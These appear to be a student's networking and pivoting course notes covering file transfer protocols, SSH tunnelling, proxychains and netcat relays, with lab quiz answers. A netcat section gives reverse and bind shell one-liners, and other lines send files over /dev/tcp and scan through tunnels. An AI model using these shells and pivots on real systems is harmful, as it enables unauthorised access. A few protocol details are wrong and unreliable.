DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
  TFTP
  	RFC 1350 Rev2
	UDP transport
	Extremely small and very simple communication
	No terminal communication ()
	Insecure (no authentication or encryption)
	No directory services
	Used often for technologies such as BOOTP and PXE
  FTP
  	Active
    Passive
	2 Channels
	RFC 959
	TCP transport
	Uses multiple TCP connections
	Control Connection (21) / Data Connection (20)
	Authentication through clear-text sign in (username and password)
	Insecure in default configuration
	Has directory services
	Can be enhanced with SSL/TLS (FTPS)
	Anonymous login
  FTPS
	File Transfer Protocol Secure
	TCP transport (TCP port 443)
	Adds SSL/TLS encryption to FTP
	Authentication with username/password and/or PKI
	Interactive terminal access
  SFTP
  	TCP transport (TCP port 22)
	Uses symmetric and asymmetric encryption
	Adds FTP like services to SSH
	Authentication through sign in (username and password) or with SSH key
	Interactive terminal access
  SCP
  	1 Channel
	TCP Transport (TCP port 22)
	Uses symmetric and asymmetric encryption
	Authentication through sign in (username and password) or with SSH key
	Non Interactive
	
	
	Download a file from a remote directory to a local directory
		scp student@172.16.82.106:secretstuff.txt /home/student
	Upload a file to a remote directory from a local directory
		scp secretstuff.txt student@172.16.82.106:/home/student
	Copy a file from a remote host to a separate remote host
		scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
	Download a file from a remote directory to a local directory
		scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student			#Captial 'P'
	Upload a file to a remote directory from a local directory
		$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student		#Capital 'P'
		
	ssh student@172.16.82.106 -L 1111:localhost:22 -NT	
	
	Download a file from a remote directory to a local directory
		scp -P 1111 student@localhost:secretstuff.txt /home/student
	Upload a file to a remote directory from a local directory
		scp -P 1111 secretstuff.txt student@localhost:/home/student
		
	SSH
		Various Implementations (v1 and v2)
		Provides authentication, encryption, and integrity.
		Allows remote terminal sessions
		Used for tunneling
		Created as a secure replacement for Berkeley Remote commands:
			rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
			rlogin - replaced with rlogin, provides remote login capability.
			rcp - replaced with scp for secure file transfer
		sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH
		SSH PORT FORWARDING
			Creates channels using SSH-CONN protocol
			Allows for tunneling of other services through SSH
			Provides insecure services encryption
		SSH LOCAL PORT FORWARDING
			Syntax
				ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
				or
				ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
		SSH LOCAL PORT FORWARDING
			Creates a local port (1111) on the local host that forwards to a target machine’s port 80.
				ssh student@172.16.82.106 -L 1111:localhost:80 -NT
				or
				ssh -L 1111:localhost:80 student@172.16.82.106 -NT
		SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT
			Internet Host:
			ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
			ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
			firefox localhost:2222
			Creates an additional local port on the local host that forwards to a target machine through the previous channel created.
		SSH DYNAMIC PORT FORWARDING
			Syntax
			ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
			Proxychains default port is 9050
			Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
			Allows the use of scripts and other userspace programs through the tunnel.
		SSH DYNAMIC PORT FORWARDING 1-STEP
			Blue Private Host-1:
			ssh student@172.16.82.106 -D 9050 -NT
			
			proxychains ./scan.sh
			proxychains ssh student@10.10.0.40
		SSH DYNAMIC PORT FORWARDING 2-STEP
			Blue Private Host-1:
			ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
			ssh student@localhost -D 9050 -p 1111 -NT

			proxychains curl ftp://www.onlineftp.ch
			proxychains wget -r www.espn.com
			proxychains ./scan.sh
			proxychains ssh student@172.16.101.2
			
====================================================================================================================================================
ssh student@172.16.82.106 -L 1111:192.168.1.10:22 -NT

ssh localhost -p 1111 -D 9050 -NT

proxychains nmap -Pn 127.0.0.1
====================================================================================================================================================
			
TRAFFIC REDIRECTION USING TOOLS
	NETCAT
		NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the TCP/IP protocol. 
		It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.
		Can be used for the following:
			inbound and outbound connections, TCP/UDP, to or from any ports
			troubleshooting network connections
			sending/receiving data (insecurely)
			port scanning (similar to -sT in Nmap)
		NETCAT: CLIENT TO LISTENER FILE TRANSFER
			Client (sends file): nc 10.2.0.2 9001 < file.txt
			Listener (receive file): nc -l -p 9001 > newfile.txt
			
		mknod thisisname p
		mkfifo MyPipe
		
		NETCAT: LISTENER TO CLIENT FILE TRANSFER
			Listener (sends file): nc -l -p 9001 < file.txt
			Client (receive file): nc 10.2.0.2 9001 > newfile.txt
		NETCAT RELAY DEMOS
			On Client Relay:
				mknod mypipe p
				nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
				nc -lp 3333 > MyPipe | nc -lp 4444
			On Listener2 (sends info):
				nc -l -p 9002 < infile.txt
			On Listener1 (receives info):
				nc -l -p 9001 > outfile.txt
			Writes the output to listener1 and listener2 through the named pipe
		FILE TRANSFER WITH /DEV/TCP
			On the receiving box:
				nc -l -p 1111 > file.txt
			On the sending box:
				cat file.txt > /dev/tcp/10.2.0.2/1111
			This method is useful for host that does not have NETCAT available.
		REVERSE SHELL USING NETCAT
			When shelled into the remote host using -c :
				nc -c /bin/sh <your ip> <any unfiltered port>
			You could even pipe BASH through NETCAT.
				/bin/sh | nc <your ip> <any unfiltered port>
			Then listen for the shell.
				nc -l -p <same unfiltered port> -vvv
			You can also listen using the -e with NETCAT.
				nc -l -p <any unfiltered port> -e /bin/bash

======================================================================================================================================================

mknod mypipe p																
nc 172.16.82.115 9876 > mypipe | nc 10.10.0.40 9999 < mypipe				
nc -lp 9999 > recieved4.jpg										# REPEAT FOR ANY ITERATION JUST CHANGE NAMES
steghide extract -sf recieved4.jpg											
md5sum phrase4.txt													

=====================================================================================================================================================

SSH REMOTE PORT FORWARDING
	Syntax
	ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
	or
	ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT
SSH REMOTE PORT FORWARDING
	Blue Host-1
	ssh student@10.10.0.40 -R 1111:localhost:80 -NT
	Creates a remote port on the remote’s local host that forwards to the target specified.
SSH REMOTE AND LOCAL PORT FORWARDING
	Blue Private Host-1:
	ssh student@172.16.82.106 -R 1111:localhost:22 -NT

	Internet Host:
	ssh student@172.16.82.106 -L 2222:localhost:1111 -NT

	Internet Host:
	ssh localhost -p 2222
	Creates a remote port on a remote machine, staging a connection.

	Also creates a local port on the localhost to connect to the previously staged connection.
COVERT CHANNEL
	A Covert Channel is a method of creating a capability to transfer information objects between endpoints that should 
	not be allowed based on policy
		Strategies attackers use to avoid detection:
			Tunnels
			ICMP
			DNS
			HTTP
======================================================================================================================================================


1.	What is the word "localhost" associated with?
		loopback address
		127.0.0.1
2.	OPS$ ssh cctc@10.50.1.150 -p 1111 			What is 1111?
		alternate ssh port on 10.50.1.150
3.	OPS$ ssh cctc@localhost -p 1111				What is 1111?			
		local listening port on OPS
4.	Which IP would we use to SSH to PC1 from OPS?		ssh cctc@__________
		10.50.1.150
5.	Which ssh syntax would properly setup a Dynamic tunnel to PC1?
		ssh -D 9050 cctc@localhost -NT
6.	Which ssh syntax would properly setup a Local tunnel to PC1 SSH port?
		ssh cctc@10.50.1.150 -L 1111:10.50.1.150:22 -NT
7.	Which ssh syntax would properly setup a Local tunnel to PC1 HTTP port?
		ssh cctc@10.50.1.150 -L 1111:localhost:80 -NT
8.	Which ssh syntax would allow us to establish a Dynamic tunnel using the Local tunnel created in Question 6?	
		ssh -D 9050 cctc@localhost -NT
9.	Which syntax would allow us to download the webpage of PC1 using the Local tunnel created in Question 7?
		wget -r http://100.1.1.1:1111
10.	Which syntax would allow us to download the webpage of PC2 using the Dynamic tunnel created in Question 8?
		proxychains wget -r http://100.1.1.2
11.	Which ssh syntax would properly setup a Local tunnel to PC2 SSH port using PC1 as your pivot?
		ssh cctc@10.50.1.150 -L 1111:100.1.1.2:22 -NT
12. 	Which ssh syntax would properly setup a 2nd Local tunnel to PC2 SSH port using the tunnel made in Question 6 as your first tunnel?
		ssh -L 2222:100.1.1.2:22 cctc@localhost -p 1111 -NT
		
